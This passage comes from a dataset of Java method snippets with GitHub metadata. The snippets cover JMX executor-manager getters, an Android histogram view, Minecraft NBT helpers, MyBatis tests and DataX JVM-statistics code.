SimpleAsyncUncaughtExceptionHandler();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/config/AsyncConfiguration.java", "stars": "2", "class_props": {"extends": null, "implements": ["AsyncConfigurer"], "modifiers": ["public"]}}, {"id": 31830, "method_name": "getNumRunningFlows", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getNumRunningFlows() {\n    return this.manager.getRunningFlows().size();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31831, "method_name": "getExecutorThreadState", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getExecutorThreadState() {\n    return this.manager.getExecutorManagerThreadState().toString();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31832, "method_name": "getExecutorThreadStage", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getExecutorThreadStage() {\n    return this.manager.getExecutorThreadStage();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31833, "method_name": "isThreadActive", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isThreadActive() {\n    return this.manager.isExecutorManagerThreadActive();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31834, "method_name": "getLastThreadCheckTime", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getLastThreadCheckTime() {\n    return this.manager.getLastExecutorManagerThreadCheckTime();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31835, "method_name": "getPrimaryExecutorHostPorts", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getPrimaryExecutorHostPorts() {\n    return new ArrayList<>(this.manager.getPrimaryServerHosts());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31836, "method_name": "getRunningFlows", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getRunningFlows() {\n    return this.manager.getRunningFlowIds();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31837, "method_name": "isQueueProcessorActive", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isQueueProcessorActive() {\n    return this.manager.isQueueProcessorThreadActive();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31838, "method_name": "getQueuedFlows", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getQueuedFlows() {\n    return this.manager.getQueuedFlowIds();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31839, "method_name": "getQueueProcessorThreadState", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getQueueProcessorThreadState() {\n    return this.manager.getQueueProcessorThreadState().toString();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31840, "method_name": "getAvailableExecutorComparatorNames", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getAvailableExecutorComparatorNames() {\n    return new ArrayList<>(this.manager.getAvailableExecutorComparatorNames());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31841, "method_name": "getAvailableExecutorFilterNames", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getAvailableExecutorFilterNames() {\n    return new ArrayList<>(this.manager.getAvailableExecutorFilterNames());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31842, "method_name": "getLastSuccessfulExecutorInfoRefresh", "class_name": "JmxExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getLastSuccessfulExecutorInfoRefresh() {\n    return this.manager.getLastSuccessfulExecutorInfoRefresh();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jmx/JmxExecutorManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["JmxExecutorManagerMBean"], "modifiers": ["public"]}}, {"id": 31843, "method_name": "onDraw", "class_name": "Practice10HistogramView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        int x = 980, y = 560;\n\n        // \u7ed8\u5236\u5750\u6807\u7cfb\n        float[] coordinateSystem = {\n                100, 60, 100, y,\n                100, y, x, y\n        };\n        mPaint.setColor(Color.BLACK);\n        mPaint.setStrokeWidth(2);\n        canvas.drawLines(coordinateSystem, mPaint);\n\n        // \u7ed8\u5236\u6807\u9898\n        String title = \"\u4e00\u5468\u6e29\u5ea6\u53d8\u5316\";\n        mPaint.setTextAlign(Paint.Align.CENTER);\n        mPaint.setTextSize(48);\n        canvas.drawText(title, getWidth() / 2, y + 140, mPaint);\n\n        int start = 30;\n        int width = 100;\n        int gap = 20;\n        int top;\n        int bottom;\n        int left = 100 + start;\n        int right = left + width;\n\n        for (int i = 0; i < weatherModels.size(); i++) {\n            // \u5f53\u524d\u6e29\u5ea6\u5bf9\u5e94\u76f4\u65b9\u56fe\u6570\u503c\u300c1 \u5ea6\u5bf9\u5e94 10 \u50cf\u7d20\u300d\n            top = y - weatherModels.get(i).temp * 10;\n            // -1 \u4e3a\u4e86\u9732\u51fa X \u8f74\n            bottom = y - 1;\n            if (i > 0) {\n                left += width + gap;\n                right += width + gap;\n            }\n\n            // \u7ed8\u5236\u6587\u5b57\uff08\u661f\u671f\u51e0\uff09\n            mPaint.setColor(Color.BLACK);\n            mPaint.setTextSize(24);\n            canvas.drawText(weatherModels.get(i).week, left + (right - left) / 2, y + 20, mPaint);\n\n            // \u7ed8\u5236\u76f4\u65b9\u56fe\n            if (40 <= weatherModels.get(i).temp) {\n                mPaint.setColor(Color.parseColor(\"#F57F17\"));\n            } else if (37 <= weatherModels.get(i).temp) {\n                mPaint.setColor(Color.parseColor(\"#FBC02D\"));\n            } else if (35 <= weatherModels.get(i).temp) {\n                mPaint.setColor(Color.parseColor(\"#FFEB3B\"));\n            } else {\n                mPaint.setColor(Color.parseColor(\"#FFF9C4\"));\n            }\n            mRect.set(left, top, right, bottom);\n            canvas.drawRect(mRect, mPaint);\n        }\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson1/Practice10HistogramView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 31844, "method_name": "getOrDefault", "class_name": "NBTHelper", "params": ["NBTTagCompound", "String", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int getOrDefault(NBTTagCompound tag, String key, int defaultValue) {\n        return tag != null && tag.hasKey(key) ? tag.getInteger(key) : defaultValue;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/NBTHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31845, "method_name": "getOrDefault", "class_name": "NBTHelper", "params": ["NBTTagCompound", "String", "float"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float getOrDefault(NBTTagCompound tag, String key, float defaultValue) {\n        return tag != null && tag.hasKey(key) ? tag.getFloat(key) : defaultValue;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/NBTHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31846, "method_name": "getOrDefault", "class_name": "NBTHelper", "params": ["NBTTagCompound", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getOrDefault(NBTTagCompound tag, String key, String defaultValue) {\n        return tag != null && tag.hasKey(key) ? tag.getString(key) : defaultValue;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/NBTHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31847, "method_name": "getOrDefault", "class_name": "NBTHelper", "params": ["NBTTagCompound", "String", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean getOrDefault(NBTTagCompound tag, String key, boolean defaultValue) {\n        return tag != null && tag.hasKey(key) ? tag.getBoolean(key) : defaultValue;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/NBTHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31848, "method_name": "getSafe", "class_name": "NBTHelper", "params": ["NBTTagCompound", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "NBTTagCompound", "snippet": "    public static NBTTagCompound getSafe(NBTTagCompound tag, String key) {\n        return tag != null && tag.hasKey(key) ? (NBTTagCompound) tag.getTag(key) : new NBTTagCompound();\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/NBTHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31849, "method_name": "fromRange", "class_name": "NBTHelper", "params": ["Range"], "throws": null, "modifiers": ["public", "static"], "return_type": "NBTTagCompound", "snippet": "    public static NBTTagCompound fromRange(Range range) {\n        NBTTagCompound tag = new NBTTagCompound();\n        tag.setFloat(\"upper\", range.getEnd());\n        tag.setFloat(\"lower\", range.getStart());\n        return tag;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/NBTHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31850, "method_name": "getRange", "class_name": "NBTHelper", "params": ["NBTTagCompound"], "throws": null, "modifiers": ["public", "static"], "return_type": "Range", "snippet": "    public static Range getRange(NBTTagCompound compound) {\n        if (compound == null || !compound.hasKey(\"upper\") || !compound.hasKey(\"lower\"))\n            return null;\n        return new Range(compound.getFloat(\"lower\"), compound.getFloat(\"upper\"));\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/NBTHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31851, "method_name": "shouldUseDefaultId", "class_name": "ProviderTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldUseDefaultId() throws Exception {\n    Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/multidb/MultiDbConfig.xml\");\n    DefaultSqlSessionFactory sqlSessionFactory = (DefaultSqlSessionFactory) new SqlSessionFactoryBuilder().build(reader);\n    Configuration c = sqlSessionFactory.getConfiguration();\n    assertEquals(\"hsql\", c.getDatabaseId());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/multidb/ProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31852, "method_name": "shouldUseProvider", "class_name": "ProviderTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldUseProvider() throws Exception {\n    Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/multidb/ProviderConfig.xml\");\n    DefaultSqlSessionFactory sqlSessionFactory = (DefaultSqlSessionFactory) new SqlSessionFactoryBuilder().build(reader);\n    Configuration c = sqlSessionFactory.getConfiguration();\n    assertEquals(\"translated\", c.getDatabaseId());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/multidb/ProviderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31853, "method_name": "getPullToRefreshScrollDirection", "class_name": "PullToRefreshViewPager", "params": [], "throws": null, "modifiers": ["final", "public"], "return_type": "Orientation", "snippet": "\tpublic final Orientation getPullToRefreshScrollDirection() {\n\t\treturn Orientation.HORIZONTAL;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-PullToRefresh-master/extras/PullToRefreshViewPager/src/com/handmark/pulltorefresh/extras/viewpager/PullToRefreshViewPager.java", "stars": "74", "class_props": {"extends": "PullToRefreshBase", "implements": null, "modifiers": ["public"]}}, {"id": 31854, "method_name": "createRefreshableView", "class_name": "PullToRefreshViewPager", "params": ["Context", "AttributeSet"], "throws": null, "modifiers": ["protected"], "return_type": "ViewPager", "snippet": "\tprotected ViewPager createRefreshableView(Context context, AttributeSet attrs) {\n\t\tViewPager viewPager = new ViewPager(context, attrs);\n\t\tviewPager.setId(R.id.viewpager);\n\t\treturn viewPager;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-PullToRefresh-master/extras/PullToRefreshViewPager/src/com/handmark/pulltorefresh/extras/viewpager/PullToRefreshViewPager.java", "stars": "74", "class_props": {"extends": "PullToRefreshBase", "implements": null, "modifiers": ["public"]}}, {"id": 31855, "method_name": "isReadyForPullStart", "class_name": "PullToRefreshViewPager", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\tprotected boolean isReadyForPullStart() {\n\t\tViewPager refreshableView = getRefreshableView();\n\n\t\tPagerAdapter adapter = refreshableView.getAdapter();\n\t\tif (null != adapter) {\n\t\t\treturn refreshableView.getCurrentItem() == 0;\n\t\t}\n\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-PullToRefresh-master/extras/PullToRefreshViewPager/src/com/handmark/pulltorefresh/extras/viewpager/PullToRefreshViewPager.java", "stars": "74", "class_props": {"extends": "PullToRefreshBase", "implements": null, "modifiers": ["public"]}}, {"id": 31856, "method_name": "isReadyForPullEnd", "class_name": "PullToRefreshViewPager", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\tprotected boolean isReadyForPullEnd() {\n\t\tViewPager refreshableView = getRefreshableView();\n\n\t\tPagerAdapter adapter = refreshableView.getAdapter();\n\t\tif (null != adapter) {\n\t\t\treturn refreshableView.getCurrentItem() == adapter.getCount() - 1;\n\t\t}\n\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-PullToRefresh-master/extras/PullToRefreshViewPager/src/com/handmark/pulltorefresh/extras/viewpager/PullToRefreshViewPager.java", "stars": "74", "class_props": {"extends": "PullToRefreshBase", "implements": null, "modifiers": ["public"]}}, {"id": 31857, "method_name": "getVmInfo", "class_name": "VMInfo", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "VMInfo", "snippet": "    public static VMInfo getVmInfo() {\n        if (vmInfo == null) {\n            synchronized (LOCK) {\n                if (vmInfo == null) {\n                    try {\n                        vmInfo = new VMInfo();\n                    } catch (Exception e) {\n                        LOG.warn(\"no need care, the fail is ignored : vmInfo init failed \" + e.getMessage(), e);\n                    }\n                }\n            }\n\n        }\n        return vmInfo;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31858, "method_name": "toString", "class_name": "VMInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"the machine info  => \\n\\n\"\n                + \"\\tosInfo:\\t\" + osInfo + \"\\n\"\n                + \"\\tjvmInfo:\\t\" + jvmInfo + \"\\n\"\n                + \"\\tcpu num:\\t\" + totalProcessorCount + \"\\n\\n\"\n                + startPhyOSStatus.toString() + \"\\n\"\n                + processGCStatus.toString() + \"\\n\"\n                + processMomoryStatus.toString() + \"\\n\";\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31859, "method_name": "totalString", "class_name": "VMInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String totalString() {\n        return (processCpuStatus.getTotalString() + processGCStatus.getTotalString());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31860, "method_name": "getDelta", "class_name": "VMInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getDelta() {\n        getDelta(true);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31861, "method_name": "getDelta", "class_name": "VMInfo", "params": ["boolean"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "void", "snippet": "    public synchronized void getDelta(boolean print) {\n\n        try {\n            if (VMInfo.isSunOsMBean(osMXBean)) {\n                long curUptime = runtimeMXBean.getUptime();\n                long curProcessTime = getLongFromOperatingSystem(osMXBean, \"getProcessCpuTime\");\n                //\u767e\u5206\u6bd4\uff0c uptime\u662fms\uff0cprocessTime\u662fnano\n                if ((curUptime > lastUpTime) && (curProcessTime >= lastProcessCpuTime)) {\n                    float curDeltaCpu = (float) (curProcessTime - lastProcessCpuTime) / ((curUptime - lastUpTime) * totalProcessorCount * 10000);\n                    processCpuStatus.setMaxMinCpu(curDeltaCpu);\n                    processCpuStatus.averageCpu = (float) curProcessTime / (curUptime * totalProcessorCount * 10000);\n\n                    lastUpTime = curUptime;\n                    lastProcessCpuTime = curProcessTime;\n                }\n            }\n\n            for (GarbageCollectorMXBean garbage : garbageCollectorMXBeanList) {\n\n                GCStatus gcStatus = processGCStatus.gcStatusMap.get(garbage.getName());\n                if (gcStatus == null) {\n                    gcStatus = new GCStatus();\n                    gcStatus.name = garbage.getName();\n                    processGCStatus.gcStatusMap.put(garbage.getName(), gcStatus);\n                }\n\n                long curTotalGcCount = garbage.getCollectionCount();\n                gcStatus.setCurTotalGcCount(curTotalGcCount);\n\n                long curtotalGcTime = garbage.getCollectionTime();\n                gcStatus.setCurTotalGcTime(curtotalGcTime);\n            }\n\n            if (memoryPoolMXBeanList != null && !memoryPoolMXBeanList.isEmpty()) {\n                for (MemoryPoolMXBean pool : memoryPoolMXBeanList) {\n\n                    MemoryStatus memoryStatus = processMomoryStatus.memoryStatusMap.get(pool.getName());\n                    if (memoryStatus == null) {\n                        memoryStatus = new MemoryStatus();\n                        memoryStatus.name = pool.getName();\n                        processMomoryStatus.memoryStatusMap.put(pool.getName(), memoryStatus);\n                    }\n                    memoryStatus.commitedSize = pool.getUsage().getCommitted();\n                    memoryStatus.setMaxMinUsedSize(pool.getUsage().getUsed());\n                    long maxMemory = memoryStatus.commitedSize > 0 ? memoryStatus.commitedSize : memoryStatus.maxSize;\n                    memoryStatus.setMaxMinPercent(maxMemory > 0 ? (float) 100 * memoryStatus.usedSize / maxMemory : -1);\n                }\n            }\n\n            if (print) {\n                LOG.info(processCpuStatus.getDeltaString() + processMomoryStatus.getDeltaString() + processGCStatus.getDeltaString());\n            }\n\n        } catch (Exception e) {\n            LOG.warn(\"no need care, the fail is ignored : vmInfo getDelta failed \" + e.getMessage(), e);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31862, "method_name": "isSunOsMBean", "class_name": "VMInfo", "params": ["OperatingSystemMXBean"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isSunOsMBean(OperatingSystemMXBean operatingSystem) {\n        final String className = operatingSystem.getClass().getName();\n\n        return \"com.sun.management.UnixOperatingSystem\".equals(className);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31863, "method_name": "getLongFromOperatingSystem", "class_name": "VMInfo", "params": ["OperatingSystemMXBean", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "    public static long getLongFromOperatingSystem(OperatingSystemMXBean operatingSystem, String methodName) {\n        try {\n            final Method method = operatingSystem.getClass().getMethod(methodName, (Class<?>[]) null);\n            method.setAccessible(true);\n            return (Long) method.invoke(operatingSystem, (Object[]) null);\n        } catch (final Exception e) {\n            LOG.info(String.format(\"OperatingSystemMXBean %s failed, Exception = %s \", methodName, e.getMessage()));\n        }\n\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31864, "method_name": "toString", "class_name": "PhyOSStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String toString() {\n            return String.format(\"\\ttotalPhysicalMemory:\\t%,.2fG\\n\"\n                            + \"\\tfreePhysicalMemory:\\t%,.2fG\\n\"\n                            + \"\\tmaxFileDescriptorCount:\\t%s\\n\"\n                            + \"\\tcurrentOpenFileDescriptorCount:\\t%s\\n\",\n                    (float) totalPhysicalMemory / GB, (float) freePhysicalMemory / GB, maxFileDescriptorCount, currentOpenFileDescriptorCount);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31865, "method_name": "setMaxMinCpu", "class_name": "ProcessCpuStatus", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setMaxMinCpu(float curCpu) {\n            this.curDeltaCpu = curCpu;\n            if (maxDeltaCpu < curCpu) {\n                maxDeltaCpu = curCpu;\n            }\n\n            if (minDeltaCpu == -1 || minDeltaCpu > curCpu) {\n                minDeltaCpu = curCpu;\n            }\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31866, "method_name": "getDeltaString", "class_name": "ProcessCpuStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getDeltaString() {\n            StringBuilder sb = new StringBuilder();\n            sb.append(\"\\n\\t [delta cpu info] => \\n\");\n            sb.append(\"\\t\\t\");\n            sb.append(String.format(\"%-30s | %-30s | %-30s | %-30s \\n\", \"curDeltaCpu\", \"averageCpu\", \"maxDeltaCpu\", \"minDeltaCpu\"));\n            sb.append(\"\\t\\t\");\n            sb.append(String.format(\"%-30s | %-30s | %-30s | %-30s \\n\",\n                    String.format(\"%,.2f%%\", processCpuStatus.curDeltaCpu),\n                    String.format(\"%,.2f%%\", processCpuStatus.averageCpu),\n                    String.format(\"%,.2f%%\", processCpuStatus.maxDeltaCpu),\n                    String.format(\"%,.2f%%\\n\", processCpuStatus.minDeltaCpu)));\n\n            return sb.toString();\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31867, "method_name": "getTotalString", "class_name": "ProcessCpuStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getTotalString() {\n            StringBuilder sb = new StringBuilder();\n            sb.append(\"\\n\\t [total cpu info] => \\n\");\n            sb.append(\"\\t\\t\");\n            sb.append(String.format(\"%-30s | %-30s | %-30s \\n\", \"averageCpu\", \"maxDeltaCpu\", \"minDeltaCpu\"));\n            sb.append(\"\\t\\t\");\n            sb.append(String.format(\"%-30s | %-30s | %-30s \\n\",\n                    String.format(\"%,.2f%%\", processCpuStatus.averageCpu),\n                    String.format(\"%,.2f%%\", processCpuStatus.maxDeltaCpu),\n                    String.format(\"%,.2f%%\\n\", processCpuStatus.minDeltaCpu)));\n\n            return sb.toString();\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31868, "method_name": "toString", "class_name": "ProcessGCStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String toString() {\n            return \"\\tGC Names\\t\" + gcStatusMap.keySet() + \"\\n\";\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31869, "method_name": "getDeltaString", "class_name": "ProcessGCStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getDeltaString() {\n            StringBuilder sb = new StringBuilder();\n            sb.append(\"\\n\\t [delta gc info] => \\n\");\n            sb.append(\"\\t\\t \");\n            sb.append(String.format(\"%-20s | %-18s | %-18s | %-18s | %-18s | %-18s | %-18s | %-18s | %-18s \\n\", \"NAME\", \"curDeltaGCCount\", \"totalGCCount\", \"maxDeltaGCCount\", \"minDeltaGCCount\", \"curDeltaGCTime\", \"totalGCTime\", \"maxDeltaGCTime\", \"minDeltaGCTime\"));\n            for (GCStatus gc : gcStatusMap.values()) {\n                sb.append(\"\\t\\t \");\n                sb.append(String.format(\"%-20s | %-18s | %-18s | %-18s | %-18s | %-18s | %-18s | %-18s | %-18s \\n\",\n                        gc.name, gc.curDeltaGCCount, gc.totalGCCount, gc.maxDeltaGCCount, gc.minDeltaGCCount,\n                        String.format(\"%,.3fs\", (float) gc.curDeltaGCTime / 1000),\n                        String.format(\"%,.3fs\", (float) gc.totalGCTime / 1000),\n                        String.format(\"%,.3fs\", (float) gc.maxDeltaGCTime / 1000),\n                        String.format(\"%,.3fs\", (float) gc.minDeltaGCTime / 1000)));\n\n            }\n            return sb.toString();\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/statistics/VMInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 31870, "method_name": "getTotalString", "class_name": "ProcessGCStatus", "params": 